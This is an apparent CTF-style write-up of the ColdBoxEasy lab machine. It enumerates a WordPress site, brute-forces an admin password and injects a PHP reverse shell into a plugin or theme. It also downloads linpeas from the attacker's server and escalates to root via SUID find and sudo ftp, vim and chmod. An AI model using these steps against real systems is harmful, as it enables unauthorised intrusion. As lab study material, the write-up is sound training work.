# ColdBoxEasy

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.149.239
```

Open ports discovered:

- **80** — HTTP (Apache httpd 2.4.18, Ubuntu)
  - Additional webpages:
    - `http://192.168.149.239/hidden/`
    - `http://192.168.149.239/wp-admin/`
    - `http://192.168.149.239/wp-content/`
    - `http://192.168.149.239/wp-includes/`
    - `http://192.168.149.239/wp-login.php`
    - `http://192.168.149.239/wp-links-opml.php`
    - `http://192.168.149.239/wp-mail.php`
    - `http://192.168.149.239/wp-trackback.php`
    - `http://192.168.149.239/xmlrpc.php`
    - `http://192.168.149.239/license.txt`
    - `http://192.168.149.239/readme.html`
- **4512** — SSH (OpenSSH 7.2p2 Ubuntu 4ubuntu2.10, protocol 2.0)

The web server was running a WordPress installation. Run `wpscan` to enumerate users and WordPress plugins:

```
wpscan --url http://192.168.149.239 -e u,ap --plugins-detection aggressive --force
...
[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.149.239/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://192.168.149.239/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] Enumerating Users (via Passive and Aggressive Methods)

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 Brute Forcing Author IDs - Time: 00:00:00
```

Four users were discovered: `the cold in person`, `philip`, `c0ldd`, and `hugo`.

Perform password cracking using `wpscan` against the discovered usernames:

```
wpscan --url http://192.168.149.239 -e u --passwords /usr/share/wordlists/rockyou.txt
...
[SUCCESS] - c0ldd / 9876543210
```

The password `9876543210` was cracked for the user `c0ldd`.

Log in as `c0ldd` at `http://192.168.149.239/wp-login.php` using the credentials `c0ldd:9876543210`. An attempt to log in via SSH as `c0ldd` with the same password was unsuccessful.

Explore the WordPress admin panel at `http://192.168.149.239/wp-admin/users.php`. The user `c0ldd` has administrator privileges, while `hugo` and `philip` are normal users.

Explore the plugins page at `http://192.168.149.239/wp-admin/plugins.php`. Two plugins are installed: Akismet and Hello Dolly.

Search for exploits against the Hello Dolly plugin:

```
searchsploit hello dolly
Exploits: No Results
Shellcodes: No Results
```

No known exploits were found. Replace the PHP code in the Hello Dolly plugin with a PHP reverse shell.

Browse to `http://192.168.149.239/wp-content/plugins/hello-dolly/hello.php` to trigger the reverse shell, caught with `penelope`:

```
www-data@lab-pg-ubuntu16-coldboxeasy-242-099:/$ whoami
www-data
```

Retrieve the `local.txt` flag:

```
www-data@lab-pg-ubuntu16-coldboxeasy-242-099:/$ find / -name local.txt 2>/dev/null
/home/c0ldd/local.txt

www-data@lab-pg-ubuntu16-coldboxeasy-242-099:/$ cat /home/c0ldd/local.txt
c5384670d35d5ab7914ef307bf5f5541
```

### Alternative Initial Access — single.php reverse shell

The WordPress theme editor can be used to inject a PHP reverse shell into the theme's `single.php` file instead of modifying a plugin. Navigate to Appearance → Theme Editor in the WordPress admin panel, select `single.php` from the active theme (e.g., `twentyfifteen`), and replace its contents with a PHP reverse shell payload. Trigger the reverse shell by visiting any single post URL on the site, which loads `single.php`, and catch the connection with a listener. Credit: [Joshua — ColdBoxEasy Writeup](https://hackindex.io/writeups/coldboxeasy)

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
python3 -m http.server 9001
```

On the target, download the script via `wget`:

```
www-data@lab-pg-ubuntu16-coldboxeasy-242-099:/tmp$ which wget
/usr/bin/wget

www-data@lab-pg-ubuntu16-coldboxeasy-242-099:/tmp$ wget http://192.168.45.198:9001/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@lab-pg-ubuntu16-coldboxeasy-242-099:/tmp$ chmod +x linpeas.sh
www-data@lab-pg-ubuntu16-coldboxeasy-242-099:/tmp$ ./linpeas.sh
```

Important findings:

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
...
-rwsr-xr-x 1 root root 217K Feb  8  2016 /usr/bin/find

╔══════════╣ Searching passwords in PHP files (T1552.001)
...
/var/www/html/wp-config.php:define('DB_PASSWORD', 'cybersecurity');
/var/www/html/wp-config.php:define('DB_USER', 'c0ldd');
```

The SUID binary `/usr/bin/find` was identified. Additionally, database credentials were found in `/var/www/html/wp-config.php`: the MySQL user `c0ldd` with password `cybersecurity`. These credentials were also used for user machine's `c0ldd`, allowing SSH and confirming password reuse.

Gain a privileged shell using the SUID `find` binary (per [GTFOBins](https://gtfobins.org/gtfobins/find/#shell)):

```
www-data@lab-pg-ubuntu16-coldboxeasy-242-099:/tmp$ find . -exec /bin/sh -p \; -quit

# whoami
root
```

Retrieve the `proof.txt` flag:

```
# cd /root
# cat proof.txt
af425209cc06c82721e66e417dcad422
```

`sudo -l` reveals that `c0ldd` can run three binaries as root: `/usr/bin/vim`, `/bin/chmod`, and `/usr/bin/ftp`. All three are listed on [GTFOBins](https://gtfobins.github.io/) and can be abused to obtain a root shell.

### Alternative Privilege Escalation — sudo ftp

The user `c0ldd` has sudo privileges to run the `ftp` binary as root (confirmed via `sudo -l`). By running `sudo ftp` with `c0ldd`'s password, the interactive FTP prompt is reached, where the `!` command allows spawning a shell. Executing `!/bin/bash` from within the FTP prompt provides a root shell:

```
c0ldd@ColddBox-Easy:~$ sudo ftp
ftp> !/bin/bash
root@ColddBox-Easy:~# id
uid=0(root) gid=0(root)
```

Credit: [aw0ken — OFFSEC ColdBoxEasy Writeup](https://medium.com/@iaw0ken/offsec-coldboxeasy-writeup-eb6eae3c968e)

### Alternative Privilege Escalation — sudo vim

The user `c0ldd` has sudo privileges to run `vim` as root (confirmed via `sudo -l`). Vim's `-c` flag can execute a command at startup, and the `:!` shell escape spawns a subshell. Running `sudo vim -c ':!/bin/bash'` with `c0ldd`'s password provides a root shell:

```
c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/bash'
# id
uid=0(root) gid=0(root)
```

Credit: [Roshan Rajbanshi — ColdBoxEasy Writeup](https://infosecwriteups.com/coldboxeasy-wordpress-theme-editor-rce-via-curl-and-three-paths-to-root-via-sudo-offsec-pg-71bde0374470)

### Alternative Privilege Escalation — sudo chmod

The user `c0ldd` has sudo privileges to run `chmod` as root (confirmed via `sudo -l`). Setting the SUID bit on `/bin/bash` with `sudo chmod u+s /bin/bash`, then launching it with `/bin/bash -p` to preserve the effective UID, provides a root shell:

```
c0ldd@ColddBox-Easy:~$ sudo chmod u+s /bin/bash
c0ldd@ColddBox-Easy:~$ /bin/bash -p
# id
uid=1000(c0ldd) gid=1000(c0ldd) euid=0(root)
```

Credit: [Roshan Rajbanshi — ColdBoxEasy Writeup](https://infosecwriteups.com/coldboxeasy-wordpress-theme-editor-rce-via-curl-and-three-paths-to-root-via-sudo-offsec-pg-71bde0374470)
